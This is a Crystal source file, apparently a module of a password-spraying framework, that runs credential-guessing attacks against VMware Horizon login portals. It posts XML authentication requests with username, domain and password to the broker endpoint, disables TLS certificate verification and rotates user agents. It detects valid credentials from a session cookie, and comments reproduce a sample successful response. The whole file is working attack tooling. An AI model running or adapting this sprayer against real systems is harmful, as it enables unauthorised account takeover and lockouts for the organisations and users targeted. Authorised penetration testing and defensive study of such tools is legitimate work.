require "http/client"




#
#   vmware horizon password sprayer. 
#   only works with windows domain joined accounts
#




class VMWare_Horizon < Sprayer

    property domain : String | Nil
    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "WORKGROUP"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String)  : SprayStatus
         # lockedout = false
        # valid = false
        # mfa = false
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With" =>  "XMLHttpRequest"
        } 

        form = "<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>windows-password</name><params><param><name>username</name><values><value>#{username}</value></values></param><param><name>domain</name><values><value>#{@domain}</value></values></param><param><name>password</name><values><value>#{password}</value></values></param></params></screen></do-submit-authentication></broker>" # request form params here
        poster = URI.parse "https://#{url.host}/broker/xml"

        # here is the basic request 
        page = client.post(poster.path, headers: header, body: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # Set-Cookie: com.vmware.vdi.broker.location.id=132d598f-ba564-497e-8149-513c56b59e46;  < this is a possible option for detecting if valid session. 
        # 
        # below is a vlaid xml option as well. the "result> ok < " could also work as invalid returns "result>partial<" 
        # <?xml version="1.0"?>
        #     <broker version="15.0">
        #         <submit-authentication>
        #             <result>ok</result>
        #             <user-sid>S-1-5-21-165498765-0193765652395-162048573-22140</user-sid>
        #             <offline-sso-disabled>false</offline-sso-disabled>
        #             <offline-sso-cache-timeout>0</offline-sso-cache-timeout>
        #             <logout-on-host-suspend-enabled>true</logout-on-host-suspend-enabled>
        #             <user-activity-interval>1800</user-activity-interval>
        #             <idle-timeout>-1</idle-timeout>
        #             <max-broker-session-time>-1</max-broker-session-time>
        #             <csrf-token>132d598f-ba564-497e-8149-513c56b59e46</csrf-token>
        #         </submit-authentication>
        #     </broker>







        # 
        # using the set-cookie header to validate if session is valid
        begin # handle if the cookie not present
            if page.cookies["com.vmware.vdi.broker.location.id"] # if cookie exists 
                # valid = true 
                spstatus.valid_credentials = true 
            end
        rescue # save from crashing if no cookie 
        end 

        # if page.body.includes? "redircting to mfa"
        #     mfa = true 
        # end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus
    end
end